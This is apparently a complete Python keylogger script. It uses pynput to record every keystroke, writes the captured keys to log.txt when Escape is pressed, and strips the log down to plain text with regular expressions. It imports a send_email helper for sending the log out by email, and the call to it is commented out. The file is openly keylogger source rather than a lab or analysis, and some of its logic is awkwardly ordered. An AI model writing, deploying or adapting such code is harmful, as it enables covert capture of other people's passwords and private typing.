from pynput.keyboard import Key, Listener # Log the data
from send_email import send_email # Send the data through Email
from KLcleaner import clean # Clean The data
import re

keys = []
def update_log():
    with open('log.txt', mode='w') as file:
        file.writelines(str(keys))

def on_press(key):
    # print(key)
    keys.append(key)

def on_release(key):
    if key==Key.esc:
        update_log()
        # send_email()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def clean():
    with open("log.txt", 'r') as file:
        msg = file.read()

    msg = msg.replace(' ', '') # removing unncessary spaces
    msg = re.sub(re.compile(r"<Key.space:''>"), ' ', msg) # replacing space by ' ' 
    regex_key = re.compile(r'(<Key\..*?)(?:\'| |\d|\"|Key.esc|\s)>(>?)') # gathering all special keys
    msg = re.sub(regex_key, '',msg)# repalcing all special keys with empty string
    msg = msg.replace('\'', '') # replacing the quote with empty string
    msg = msg.replace(',', '')  # replacing the comma with empty string
    print(msg)

clean()